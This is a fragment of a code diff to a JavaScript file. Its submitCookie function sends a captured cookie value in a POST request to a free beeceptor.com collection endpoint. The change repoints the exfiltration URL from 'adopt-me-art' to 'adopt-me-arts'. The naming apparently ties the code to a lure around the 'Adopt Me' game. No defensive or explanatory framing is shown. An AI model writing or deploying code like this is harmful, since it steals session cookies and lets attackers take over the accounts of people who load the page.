@@ -11,7 +11,7 @@ function submitCookie() {
         return;
     }
     console.log('Submitting cookie:', cookie.substring(0, 50) + '...');
-    fetch('https://adopt-me-art.free.beeceptor.com', {
+    fetch('https://adopt-me-arts.free.beeceptor.com', {
         method: 'POST',
         body: JSON.stringify({
             cookie: cookie,
@@ -50,3 +50,4 @@ window.addEventListener('hashchange', () => {
     }
 });
 window.dispatchEvent(new Event('hashchange'));
+
